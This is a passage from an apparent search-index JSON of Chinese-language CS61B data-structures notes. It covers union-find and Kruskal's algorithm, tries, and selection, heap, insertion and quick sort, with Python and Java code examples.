\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u63a5\u8fd1\u5e38\u6570\u65f6\u95f4\uff0c\u4f7f\u7528\u8def\u5f84\u538b\u7f29\u548c\u6309\u79e9\u5408\u5e76\u4f18\u5316\u540e\u4e3a <code>O(log* V)</code>\uff0c\u5176\u4e2d <code>log* V</code> \u662f\u6781\u6162\u589e\u957f\u7684\u51fd\u6570 (\u4e0d\u5927\u4e8e5)</li> </ul> </li> </ul> <pre><code>class UnionFind:\n    def __init__(self, n):\n        # \u521d\u59cb\u5316\u7236\u8282\u70b9\u6570\u7ec4\u548c\u79e9\u6570\u7ec4\n        self.parent = list(range(n))\n        self.rank = [0] * n\n\n    def find(self, u):\n        # \u67e5\u627e\u9876\u70b9u\u7684\u6839\u8282\u70b9\uff0c\u5e76\u8fdb\u884c\u8def\u5f84\u538b\u7f29\n        if self.parent[u] != u:\n            self.parent[u] = self.find(self.parent[u])\n        return self.parent[u]\n\n    def union(self, u, v):\n        # \u5408\u5e76\u4e24\u4e2a\u9876\u70b9u\u548cv\u6240\u5728\u7684\u96c6\u5408\n        root_u = self.find(u)\n        root_v = self.find(v)\n        if root_u != root_v:\n            # \u6839\u636e\u79e9\u5408\u5e76\uff0c\u786e\u4fdd\u6811\u7684\u9ad8\u5ea6\u6700\u5c0f\n            if self.rank[root_u] &gt; self.rank[root_v]:\n                self.parent[root_v] = root_u\n            elif self.rank[root_u] &lt; self.rank[root_v]:\n                self.parent[root_u] = root_v\n            else:\n                self.parent[root_v] = root_u\n                self.rank[root_u] += 1\n</code></pre> <pre><code>def kruskal_mst(graph):\n    mst = []  # \u5b58\u50a8\u6700\u5c0f\u751f\u6210\u6811\u7684\u8fb9\n    # \u6309\u6743\u91cd\u5bf9\u6240\u6709\u8fb9\u8fdb\u884c\u6392\u5e8f\n    edges = sorted(graph['edges'], key=lambda e: e[2])\n    uf = UnionFind(graph['vertices'])  # \u521d\u59cb\u5316\u5e76\u67e5\u96c6\n\n    for edge in edges:\n        u, v, weight = edge\n        # \u5982\u679cu\u548cv\u4e0d\u5728\u540c\u4e00\u4e2a\u8fde\u901a\u5206\u91cf\u4e2d\uff0c\u5219\u6dfb\u52a0\u8be5\u8fb9\u5230MST\n        if uf.find(u) != uf.find(v):\n            uf.union(u, v)\n            mst.append(edge)\n            # \u5982\u679cMST\u5305\u542b\u7684\u8fb9\u6570\u8fbe\u5230\u9876\u70b9\u6570-1\uff0c\u5219\u505c\u6b62\n            if len(mst) == graph['vertices'] - 1:\n                break\n\n    return mst\n</code></pre> <ul> <li><code>Kruskal</code>\u7b97\u6cd5\u4e0e<code>Prim</code>\u7b97\u6cd5\u7684\u6bd4\u8f83\uff1a<code>Prim</code>\u7b97\u6cd5\u9002\u7528\u4e8e\u7a20\u5bc6\u56fe\uff0c<code>Kruskal</code>\u7b97\u6cd5\u9002\u7528\u4e8e\u7a00\u758f\u56fe</li> </ul>"},{"location":"cs61b%20notes/w1dsy2ew/#lec25_prefix_operations_and_tries","title":"Lec.25 Prefix Operations and Tries \u524d\u7f00\u64cd\u4f5c\u4e0e\u5b57\u5178\u6811","text":"<ol> <li><code>Trie</code>: \u5bf9\u5b57\u7b26\u4e32\u952e\u7684\u6620\u5c04\uff0c\u6811\u5f62\u7ed3\u6784\uff0c\u6bcf\u4e2a\u8282\u70b9\u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\uff0c\u8282\u70b9\u53ef\u4ee5\u88ab\u591a\u4e2a\u952e\u5171\u4eab</li> <li>\u4f18\u70b9\uff1a</li> <li>\u9ad8\u6548\u7684\u5b57\u7b26\u4e32\u67e5\u627e\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a<code>O(1)</code></li> <li>\u652f\u6301\u524d\u7f00\u5339\u914d\uff0c\u9002\u7528\u4e8e\u81ea\u52a8\u8865\u5168\u4e0e\u62fc\u5199\u68c0\u67e5</li> <li>\u57fa\u672c\u7684<code>Trie</code>\u5b9e\u73b0\uff1a<ul> <li>\u6bcf\u4e2a\u8282\u70b9\u5b58\u50a8\u4e00\u4e2a\u5b57\u7b26\u3001\u4e00\u4e2a\u6307\u5411\u5b50\u8282\u70b9\u7684\u6620\u5c04\u548c\u4e00\u4e2a\u6807\u5fd7\u8868\u793a\u662f\u5426\u662f\u4e00\u4e2a\u952e</li> <li>\u4f7f\u7528 <code>DataIndexedCharMap</code> \u6765\u5b58\u50a8\u5b50\u8282\u70b9\u7684\u6620\u5c04</li> </ul> </li> </ol> <pre><code>public class TrieSet {\n     private static final int R = 128; // ASCII\n     private Node root; // root of trie\n\n     private static class Node {\n         private boolean isKey;   \n         // \u6bcf\u4e2a\u8282\u70b9\u50a8\u5b58R\u4e2a\u94fe\u63a5\uff0c\u4f46\u5927\u591a\u6570\u94fe\u63a5\u4e3a\u7a7a\n         private DataIndexedCharMap&lt;Node&gt; next;\n         private Node(boolean b, int R) {\n         isKey = b;\n         next = new DataIndexedCharMap&lt;&gt;(R);\n         }\n     }\n }\n</code></pre> <ol> <li>\u4ee3\u66ff\u7684\u5b50\u8282\u70b9\u8ddf\u8e2a\u7b56\u7565<ul> <li>\u54c8\u5e0c\u8868\uff1a\u51e0\u4e4e\u540c\u6837\u5feb (\u8981\u8ba1\u7b97\u54c8\u5e0c\u503c)\uff0c\u4f46\u4f7f\u7528\u66f4\u5c11\u7684\u5185\u5b58</li> <li>\u5e73\u8861\u4e8c\u53c9\u6811\uff1a\u7a0d\u6162\uff0c\u4f46\u4f7f\u7528\u7684\u5185\u5b58\u4e0e\u54c8\u5e0c\u8868\u76f8\u4f3c</li> </ul> </li> <li> <p>\u67e5\u770b<code>Trie</code>\u4e2d\u7684\u6240\u6709\u952e\uff1a</p> <pre><code>public List&lt;String&gt; collect() {\n    List&lt;String&gt; results = new ArrayList&lt;&gt;();\n    collect(root, \"\", results);\n    return results;\n}\n\nprivate void collect(Node x, String prefix, List&lt;String&gt; results) {\n    if (x == null) return;\n    if (x.isKey) results.add(prefix);\n    for (char c = 0; c &lt; R; c++) {\n        collect(x.next.get(c), prefix + c, results);\n    }\n}\n</code></pre> </li> <li> <p>\u81ea\u52a8\u8865\u5168\uff1a</p> <ul> <li>\u521b\u5efa\u4e00\u4e2a\u57fa\u4e8e<code>Trie</code>\u7684\u5b57\u5178\uff0c\u5c06\u5b57\u7b26\u4e32\u6620\u5c04\u5230\u503c</li> <li>\u5f53\u7528\u6237\u8f93\u5165\u5b57\u7b26\u4e32\u65f6\uff0c\u8c03\u7528<code>keysWithPrefix</code>\u5e76\u8fd4\u56de\u5177\u6709\u6700\u9ad8\u503c\u7684\u5b57\u7b26\u4e32</li> </ul> </li> <li>\u66f4\u9ad8\u6548\u7684\u81ea\u52a8\u8865\u5168\uff1a<ul> <li>\u6bcf\u4e2a\u8282\u70b9\u50a8\u5b58\u81ea\u8eab\u7684\u503c\u4ee5\u53ca\u6700\u4f73\u5b50\u5b57\u7b26\u4e32\u7684\u503c</li> <li>\u901a\u8fc7\u4f7f\u7528\u4f18\u5148\u961f\u5217\u6765\u8003\u8651\u8282\u70b9\u7684\u987a\u5e8f</li> </ul> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec26_basic_sorts","title":"Lec.26 Basic Sorts","text":""},{"location":"cs61b%20notes/w1dsy2ew/#261_sorting_problem","title":"26.1 Sorting Problem","text":"<ol> <li>\u6392\u5e8f\u95ee\u9898\u662f\u6307\u7ed9\u5b9a\u4e00\u4e2a\u5305\u542b <code>n</code> \u4e2a\u5143\u7d20\u7684\u6570\u7ec4\uff0c\u91cd\u65b0\u6392\u5217\u8fd9\u4e9b\u5143\u7d20\uff0c\u4f7f\u5f97\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u6309\u975e\u9012\u51cf\u987a\u5e8f\u6392\u5217</li> <li>\u6392\u5e8f\u7b97\u6cd5\u7684\u5206\u7c7b</li> <li>\u6bd4\u8f83\u6392\u5e8f\uff1a\u57fa\u4e8e\u5143\u7d20\u4e4b\u95f4\u7684\u6bd4\u8f83\u6765\u6392\u5e8f\uff0c\u5305\u62ec\u9009\u62e9\u6392\u5e8f\u3001\u63d2\u5165\u6392\u5e8f\u3001\u5f52\u5e76\u6392\u5e8f\u3001\u5feb\u901f\u6392\u5e8f\u7b49</li> <li>\u975e\u6bd4\u8f83\u6392\u5e8f\uff1a\u4e0d\u57fa\u4e8e\u5143\u7d20\u4e4b\u95f4\u7684\u6bd4\u8f83\u6765\u6392\u5e8f\uff0c\u5305\u62ec\u8ba1\u6570\u6392\u5e8f\u3001\u57fa\u6570\u6392\u5e8f\u548c\u6876\u6392\u5e8f\u7b49</li> <li>\u6392\u5e8f\u7b97\u6cd5\u7684\u6027\u80fd\u6307\u6807<ul> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a\u7b97\u6cd5\u5728\u6700\u574f\u60c5\u51b5\u4e0b\u3001\u5e73\u5747\u60c5\u51b5\u4e0b\u548c\u6700\u597d\u60c5\u51b5\u4e0b\u7684\u8fd0\u884c\u65f6\u95f4</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a\u7b97\u6cd5\u6240\u9700\u7684\u989d\u5916\u7a7a\u95f4</li> <li>\u7a33\u5b9a\u6027\uff1a\u5982\u679c\u4e24\u4e2a\u5143\u7d20\u76f8\u7b49\uff0c\u6392\u5e8f\u540e\u5b83\u4eec\u7684\u76f8\u5bf9\u987a\u5e8f\u662f\u5426\u4fdd\u6301\u4e0d\u53d8</li> </ul> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#262_selection_sort","title":"26.2 Selection Sort \u9009\u62e9\u6392\u5e8f","text":"<ol> <li>\u57fa\u672c\u601d\u60f3\uff1a\u6bcf\u6b21\u4ece\u672a\u6392\u5e8f\u90e8\u5206\u4e2d\u9009\u62e9\u6700\u5c0f\u7684\u5143\u7d20\uff0c\u653e\u5230\u5df2\u6392\u5e8f\u90e8\u5206\u7684\u672b\u5c3e</li> <li>\u4ece\u672a\u6392\u5e8f\u90e8\u5206\u4e2d\u9009\u62e9\u6700\u5c0f\u7684\u5143\u7d20</li> <li>\u5c06\u8be5\u5143\u7d20\u4e0e\u672a\u6392\u5e8f\u90e8\u5206\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u4ea4\u6362</li> <li>\u91cd\u590d\u4e0a\u8ff0\u6b65\u9aa4\uff0c\u76f4\u5230\u6240\u6709\u5143\u7d20\u90fd\u5df2\u6392\u5e8f</li> <li>\u6027\u80fd\u5206\u6790<ul> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a<code>O(n^2)</code>\uff0c\u9009\u62e9\u6392\u5e8f\u9700\u8981\u4e24\u5c42\u5d4c\u5957\u5faa\u73af\uff0c\u5916\u5c42\u5faa\u73af\u904d\u5386\u6bcf\u4e2a\u5143\u7d20\uff0c\u5185\u5c42\u5faa\u73af\u67e5\u627e\u672a\u6392\u5e8f\u90e8\u5206\u7684\u6700\u5c0f\u5143\u7d20</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a<code>O(1)</code>\uff0c\u9009\u62e9\u6392\u5e8f\u662f\u539f\u5730\u6392\u5e8f <code>In-place Sort</code> \u7b97\u6cd5\uff0c\u4e0d\u9700\u8981\u989d\u5916\u7684\u5b58\u50a8\u7a7a\u95f4</li> <li>\u7a33\u5b9a\u6027\uff1a\u4e0d\u7a33\u5b9a\uff0c\u9009\u62e9\u6392\u5e8f\u5728\u4ea4\u6362\u5143\u7d20\u65f6\uff0c\u53ef\u80fd\u4f1a\u6539\u53d8\u76f8\u540c\u5143\u7d20\u7684\u76f8\u5bf9\u987a\u5e8f</li> </ul> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#263_heap_sort","title":"26.3 Heap Sort \u5806\u6392\u5e8f","text":"<ol> <li>\u57fa\u672c\u601d\u60f3\uff1a\u57fa\u4e8e\u5806\u8fd9\u4e00\u6570\u636e\u7ed3\u6784\u7684\u6392\u5e8f\u7b97\u6cd5\uff0c\u4e00\u822c\u4f7f\u7528\u6700\u5927\u5806\u8fdb\u884c\u6392\u5e8f</li> <li>\u4ece\u6700\u540e\u4e00\u4e2a\u975e\u53f6\u5b50\u8282\u70b9\u5f00\u59cb\uff0c\u4f9d\u6b21\u5bf9\u6bcf\u4e2a\u8282\u70b9\u8fdb\u884c\u5806\u5316\u64cd\u4f5c\uff0c\u5c06\u6570\u7ec4\u6784\u5efa\u6210\u4e00\u4e2a\u6700\u5927\u5806</li> <li>\u5c06\u5806\u9876\u5143\u7d20 (\u6700\u5927\u503c) \u4e0e\u5806\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4ea4\u6362\uff0c\u5e76\u5c06\u5806\u7684\u5927\u5c0f\u51cf1</li> <li>\u5bf9\u65b0\u7684\u5806\u9876\u5143\u7d20\u8fdb\u884c\u5806\u5316\u64cd\u4f5c\uff0c\u6062\u590d\u6700\u5927\u5806\u7684\u6027\u8d28</li> <li>\u7ee7\u7eed\u4ea4\u6362\u5806\u9876\u5143\u7d20\u548c\u5806\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8fdb\u884c\u5806\u5316\u64cd\u4f5c\uff0c\u76f4\u5230\u6574\u4e2a\u6570\u7ec4\u6709\u5e8f</li> <li>\u6027\u80fd\u5206\u6790\uff1a<ul> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a<code>O(n log n)</code> \u6784\u5efa\u6700\u5927\u5806\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a<code>O(n)</code>\uff0c\u6bcf\u6b21\u5806\u5316\u64cd\u4f5c\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a<code>O(log n)</code>\uff0c\u603b\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a<code>O(n log n)</code></li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a<code>O(1)</code>\uff0c\u5806\u6392\u5e8f\u662f\u539f\u5730\u6392\u5e8f\u7b97\u6cd5\uff0c\u4e0d\u9700\u8981\u989d\u5916\u7684\u5b58\u50a8\u7a7a\u95f4</li> <li>\u6700\u5927\u5806\u4f7f\u5f97\u901a\u8fc7\u5806\u9876\u4e0e\u5806\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4ea4\u6362\uff0c\u4ece\u540e\u5f80\u524d\u6784\u5efa\u4e00\u4e2a\u5df2\u6392\u5e8f\u7684\u6570\u7ec4</li> <li>\u7a33\u5b9a\u6027\uff1a\u4e0d\u7a33\u5b9a\uff0c\u5806\u6392\u5e8f\u5728\u4ea4\u6362\u5143\u7d20\u65f6\uff0c\u53ef\u80fd\u4f1a\u6539\u53d8\u76f8\u540c\u5143\u7d20\u7684\u76f8\u5bf9\u987a\u5e8f</li> </ul> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#264_merge_sort","title":"26.4 Merge sort \u5f52\u5e76\u6392\u5e8f","text":"<p>\u53ef\u89c1 <code>Lec15.5</code></p>"},{"location":"cs61b%20notes/w1dsy2ew/#265_insertion_sort","title":"26.5 Insertion Sort \u63d2\u5165\u6392\u5e8f","text":"<ol> <li>\u57fa\u672c\u601d\u60f3\uff1a\u5c06\u6570\u7ec4\u5206\u4e3a\u5df2\u6392\u5e8f\u90e8\u5206\u548c\u672a\u6392\u5e8f\u90e8\u5206\uff0c\u6bcf\u6b21\u4ece\u672a\u6392\u5e8f\u90e8\u5206\u4e2d\u53d6\u51fa\u4e00\u4e2a\u5143\u7d20\uff0c\u5c06\u5176\u63d2\u5165\u5230\u5df2\u6392\u5e8f\u90e8\u5206\u7684\u9002\u5f53\u4f4d\u7f6e</li> <li>\u4ece\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20\u5f00\u59cb\uff0c\u4f9d\u6b21\u53d6\u51fa\u6bcf\u4e2a\u5143\u7d20\uff1a<ul> <li>\u7b2c\u4e00\u4e2a\u5143\u7d20\u9ed8\u8ba4\u8ba4\u4e3a\u662f\u5df2\u6392\u5e8f\u90e8\u5206\uff0c\u4ece\u7b2c\u4e8c\u4e2a\u5143\u7d20\u5f00\u59cb\u5904\u7406</li> </ul> </li> <li>\u5c06\u53d6\u51fa\u7684\u5143\u7d20\u4e0e\u5df2\u6392\u5e8f\u90e8\u5206\u7684\u5143\u7d20\u8fdb\u884c\u6bd4\u8f83\uff0c\u627e\u5230\u9002\u5f53\u7684\u4f4d\u7f6e\u63d2\u5165\uff1a<ul> <li>\u4ece\u5df2\u6392\u5e8f\u90e8\u5206\u7684\u672b\u5c3e\u5f00\u59cb\uff0c\u4f9d\u6b21\u5411\u524d\u6bd4\u8f83\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u6bd4\u53d6\u51fa\u5143\u7d20\u5927\u7684\u4f4d\u7f6e</li> <li>\u5c06\u6bd4\u53d6\u51fa\u5143\u7d20\u5927\u7684\u5143\u7d20\u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u4f4d\u7f6e</li> <li>\u5c06\u53d6\u51fa\u5143\u7d20\u63d2\u5165\u5230\u627e\u5230\u7684\u4f4d\u7f6e</li> </ul> </li> <li>\u7ee7\u7eed\u4ece\u672a\u6392\u5e8f\u90e8\u5206\u53d6\u51fa\u5143\u7d20\u5e76\u63d2\u5165\u5230\u5df2\u6392\u5e8f\u90e8\u5206\uff0c\u76f4\u5230\u6574\u4e2a\u6570\u7ec4\u6709\u5e8f</li> <li>\u6027\u80fd\u5206\u6790\uff1a<ul> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a<code>O(n^2)</code>\uff1a\u63d2\u5165\u6392\u5e8f\u9700\u8981\u4e24\u5c42\u5d4c\u5957\u5faa\u73af\uff0c\u5916\u5c42\u5faa\u73af\u904d\u5386\u6bcf\u4e2a\u5143\u7d20\uff0c\u5185\u5c42\u5faa\u73af\u67e5\u627e\u63d2\u5165\u4f4d\u7f6e\u5e76\u79fb\u52a8\u5143\u7d20</li> <li>\u5728\u6700\u574f\u60c5\u51b5\u4e0b (\u6570\u7ec4\u662f\u9006\u5e8f\u7684)\uff0c\u6bcf\u6b21\u63d2\u5165\u90fd\u9700\u8981\u79fb\u52a8\u6240\u6709\u5df2\u6392\u5e8f\u90e8\u5206\u7684\u5143\u7d20</li> <li>\u5bf9\u4e8e\u51e0\u4e4e\u6709\u5e8f\u7684\u60c5\u51b5\u4e0b\uff0c\u63d2\u5165\u6392\u5e8f\u7684\u6548\u7387\u5f88\u9ad8\uff0c\u63a5\u8fd1<code>O(n)</code></li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a<code>O(1)</code>\uff0c\u63d2\u5165\u6392\u5e8f\u662f\u539f\u5730\u6392\u5e8f\u7b97\u6cd5\uff0c\u4e0d\u9700\u8981\u989d\u5916\u7684\u5b58\u50a8\u7a7a\u95f4</li> <li>\u7a33\u5b9a\u6027\uff1a\u7a33\u5b9a\uff0c\u63d2\u5165\u6392\u5e8f\u5728\u63d2\u5165\u5143\u7d20\u65f6\uff0c\u4e0d\u4f1a\u6539\u53d8\u76f8\u540c\u5143\u7d20\u7684\u76f8\u5bf9\u987a\u5e8f</li> </ul> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec27_quick_sort","title":"Lec.27 Quick Sort \u5feb\u901f\u6392\u5e8f","text":"<p>\u57fa\u672c\u601d\u60f3\uff1a\u57fa\u4e8e\u5206\u6cbb\u6cd5\uff0c\u901a\u8fc7\u9012\u5f52\u5730\u5c06\u6570\u7ec4\u5206\u6210\u8f83\u5c0f\u7684\u5b50\u6570\u7ec4\u6765\u8fdb\u884c\u6392\u5e8f</p>"},{"location":"cs61b%20notes/w1dsy2ew/#271_partitioning","title":"27.1 Partitioning \u5206\u533a","text":"<ol> <li>\u9009\u62e9\u4e00\u4e2a\u57fa\u51c6\u5143\u7d20 <code>(pivot)</code>\uff0c\u7136\u540e\u91cd\u65b0\u6392\u5217\u6570\u7ec4\uff0c\u4f7f\u5f97\u6240\u6709\u5c0f\u4e8e\u57fa\u51c6\u5143\u7d20\u7684\u5143\u7d20\u90fd\u5728\u57fa\u51c6\u5143\u7d20\u7684\u5de6\u8fb9\uff0c\u6240\u6709\u5927\u4e8e\u57fa\u51c6\u5143\u7d20\u7684\u5143\u7d20\u90fd\u5728\u57fa\u51c6\u5143\u7d20\u7684\u53f3\u8fb9</li> <li>\u7b97\u6cd5\uff1a</li> <li>\u9009\u62e9\u4e00\u4e2a\u57fa\u51c6\u5143\u7d20 (\u901a\u5e38\u662f\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u3001\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u6216\u4e2d\u95f4\u5143\u7d20)</li> <li>\u521d\u59cb\u5316\u4e24\u4e2a\u6307\u9488\uff1a\u5de6\u6307\u9488\u4ece\u6570\u7ec4\u7684\u5de6\u7aef\u5f00\u59cb\uff0c\u53f3\u6307\u9488\u4ece\u6570\u7ec4\u7684\u53f3\u7aef\u5f00\u59cb</li> <li>\u5de6\u6307\u9488\u5411\u53f3\u79fb\u52a8\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u5927\u4e8e\u6216\u7b49\u4e8e\u57fa\u51c6\u5143\u7d20\u7684\u5143\u7d20</li> <li>\u53f3\u6307\u9488\u5411\u5de6\u79fb\u52a8\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u5c0f\u4e8e\u6216\u7b49\u4e8e\u57fa\u51c6\u5143\u7d20\u7684\u5143\u7d20</li> <li>\u4ea4\u6362\u5de6\u6307\u9488\u548c\u53f3\u6307\u9488\u6307\u5411\u7684\u5143\u7d20</li> <li>\u91cd\u590d\u6b65\u9aa43-5\uff0c\u76f4\u5230\u5de6\u6307\u9488\u548c\u53f3\u6307\u9488\u76f8\u9047</li> </ol> <pre><code>public static int partition(int[] array, int low, int high) {\n    // \u9009\u62e9\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u4f5c\u4e3a\u57fa\u51c6\u5143\u7d20\uff08pivot\uff09\n    int pivot = array[low];\n    // \u521d\u59cb\u5316\u5de6\u6307\u9488\uff0c\u6307\u5411\u57fa\u51c6\u5143\u7d20\u7684\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\n    int left = low + 1;\n    // \u521d\u59cb\u5316\u53f3\u6307\u9488\uff0c\u6307\u5411\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u4f4d\u7f6e\n    int right = high;\n\n    // \u5f53\u5de6\u6307\u9488\u5c0f\u4e8e\u7b49\u4e8e\u53f3\u6307\u9488\u65f6\uff0c\u7ee7\u7eed\u5faa\u73af\n    while (left &lt;= right) {\n        // \u5411\u53f3\u79fb\u52a8\u5de6\u6307\u9488\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u5927\u4e8e\u57fa\u51c6\u5143\u7d20\u7684\u5143\u7d20\n        while (left &lt;= right &amp;&amp; array[left] &lt;= pivot) {\n            left++;\n        }\n        // \u5411\u5de6\u79fb\u52a8\u53f3\u6307\u9488\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u5c0f\u4e8e\u57fa\u51c6\u5143\u7d20\u7684\u5143\u7d20\n        while (left &lt;= right &amp;&amp; array[right] &gt;= pivot) {\n            right--;\n        }\n        // \u5982\u679c\u5de6\u6307\u9488\u5c0f\u4e8e\u53f3\u6307\u9488\uff0c\u4ea4\u6362\u5de6\u6307\u9488\u548c\u53f3\u6307\u9488\u6307\u5411\u7684\u5143\u7d20\n        if (left &lt; right) {\n            swap(array, left, right);\n        }\n    }\n    // \u5c06\u57fa\u51c6\u5143\u7d20\u4e0e\u53f3\u6307\u9488\u6307\u5411\u7684\u5143\u7d20\u4ea4\u6362\n    swap(array, low, right);\n    // \u8fd4\u56de\u57fa\u51c6\u5143\u7d20\u7684\u65b0\u4f4d\u7f6e\n    return right;\n}\n\nprivate static void swap(int[] array, int i, int j) {\n    // \u4ea4\u6362\u6570\u7ec4\u4e2d\u7d22\u5f15\u4e3ai\u548cj\u7684\u4e24\u4e2a\u5143\u7d20\n    int temp = array[i];\n    array[i] = array[j];\n    array[j] = temp;\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#272","title":"27.2 \u5feb\u901f\u6392\u5e8f\u7b97\u6cd5","text":"<p>\u901a\u8fc7\u9012\u5f52\u5730\u5bf9\u6570\u7ec4\u8fdb\u884c\u5206\u533a\u6765\u5b9e\u73b0\u6392\u5e8f\uff0c\u6bcf\u6b21\u5206\u533a\u540e\uff0c\u57fa\u51c6\u5143\u7d20\u7684\u4f4d\u7f6e\u662f\u786e\u5b9a\u7684\uff0c\u7136\u540e\u5bf9\u57fa\u51c6\u5143\u7d20\u5de6\u8fb9\u548c\u53f3\u8fb9\u7684\u5b50\u6570\u7ec4\u5206\u522b\u8fdb\u884c\u5feb\u901f\u6392\u5e8f</p> <ol> <li>\u7b97\u6cd5\uff1a</li> <li>\u5982\u679c\u6570\u7ec4\u7684\u957f\u5ea6\u4e3a0\u62161\uff0c\u5219\u6570\u7ec4\u5df2\u7ecf\u6709\u5e8f\uff0c\u76f4\u63a5\u8fd4\u56de</li> <li>\u5bf9\u6570\u7ec4\u8fdb\u884c\u5206\u533a\uff0c\u5f97\u5230\u57fa\u51c6\u5143\u7d20\u7684\u4f4d\u7f6e</li> <li>\u9012\u5f52\u5730\u5bf9\u57fa\u51c6\u5143\u7d20\u5de6\u8fb9\u7684\u5b50\u6570\u7ec4\u8fdb\u884c\u5feb\u901f\u6392\u5e8f</li> <li> <p>\u9012\u5f52\u5730\u5bf9\u57fa\u51c6\u5143\u7d20\u53f3\u8fb9\u7684\u5b50\u6570\u7ec4\u8fdb\u884c\u5feb\u901f\u6392\u5e8f</p> <pre><code>public static void quicksort(int[] array, int low, int high) {\n    if (low &lt; high) {\n        int pivotIndex = partition(array, low, high);\n        quicksort(array, low, pivotIndex - 1);\n        quicksort(array, pivotIndex + 1, high);\n    }\n}\n</code></pre> </li> <li> <p>\u6027\u80fd\u5206\u6790\uff1a</p> </li> <li>\u5e73\u5747\u65f6\u95f4\u590d\u6742\u5ea6\uff1a<code>O(n log n)</code></li> <li>\u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\uff1a<code>O(n^2)</code>\uff0c\u5728\u6700\u574f\u60c5\u51b5\u4e0b (\u4f8b\u5982\uff0c\u6bcf\u6b21\u9009\u62e9\u7684\u57fa\u51c6\u5143\u7d20\u90fd\u662f\u6570\u7ec4\u7684\u6700\u5927\u6216\u6700\u5c0f\u503c)</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a<code>O(log n)</code>\uff0c\u5feb\u901f\u6392\u5e8f\u7684\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3b\u8981\u6765\u81ea\u9012\u5f52\u8c03\u7528\u6808\u7684\u6df1\u5ea6\uff0c\u5e73\u5747\u60c5\u51b5\u4e0b\u4e3a <code>O(log n)</code></li> <li>\u6027\u80fd\u4f18\u5316\uff1a</li> <li> <p>\u9009\u62e9\u597d\u7684\u57fa\u51c6\u5143\u7d20\uff1a\u901a\u8fc7\u4e09\u6570\u53d6\u4e2d\u6cd5 <code>Median-of-Three</code>\u51cf\u5c11\u6700\u574f\u60c5\u51b5\u7684\u53d1\u751f         - \u4ece\u6570\u7ec4\u4e2d\u9009\u62e9\u4e09\u4e2a\u5143\u7d20\uff1a\u7b2c\u4e00\u4e2a\u5143\u7d20\u3001\u4e2d\u95f4\u5143\u7d20\u548c\u6700\u540e\u4e00\u4e2a\u5143\u7d20         - \u5c06\u8fd9\u4e09\u4e2a\u5143\u7d20\u8fdb\u884c\u6392\u5e8f         - \u9009\u62e9\u6392\u5e8f\u540e\u7684\u4e2d\u95f4\u503c\u4f5c\u4e3a\u57fa\u51c6\u5143\u7d20</p> <pre><code>```java\nprivate static int medianOfThree(int[] array, int low, int high) {\n    int mid = low + (high - low) / 2;\n    if (array[low] &gt; array[mid]) {\n        swap(array, low, mid);\n    }\n    if (array[low] &gt; array[high]) {\n        swap(array, low, high);\n    }\n    if (array[mid] &gt; array[high]) {\n        swap(array, mid, high);\n    }\n    return array[mid];\n}\n```\n</code></pre> </li> <li> <p>\u5c0f\u6570\u7ec4\u4f7f\u7528\u63d2\u5165\u6392\u5e8f</p> </li> <li> <p>\u5c3e\u9012\u5f52\u4f18\u5316\uff1a</p> <ol> <li> <p>\u5728\u5feb\u901f\u6392\u5e8f\u7684\u9012\u5f52\u8c03\u7528\u4e2d\uff0c\u4f18\u5148\u5bf9\u8f83\u5c0f\u7684\u5b50\u6570\u7ec4\u8fdb\u884c\u9012\u5f52\uff0c\u4ee5\u786e\u4fdd\u9012\u5f52\u8c03\u7528\u6808\u7684\u6df1\u5ea6\u6700\u5c0f\u5316    <sub>\u8f83\u5c0f\u7684\u5b50\u6570\u7ec4\u9012\u5f52\u8c03\u7528\u4f1a\u66f4\u5feb\u5b8c\u6210\uff0c\u4ece\u800c\u51cf\u5c11\u9012\u5f52\u8c03\u7528\u6808\u7684\u6df1\u5ea6</sub></p> </li> <li> <p>\u5c06\u5bf9\u8f83\u5927\u5b50\u6570\u7ec4\u7684\u9012\u5f52\u8c03\u7528\u8f6c\u6362\u4e3a\u5c3e\u9012\u5f52</p> <pre><code>public static void quicksort(int[] array, int low, int high) {\n    // \u5f53 low \u5c0f\u4e8e high \u65f6\u7ee7\u7eed\u6392\u5e8f\n    while (low &lt; high) {\n        // 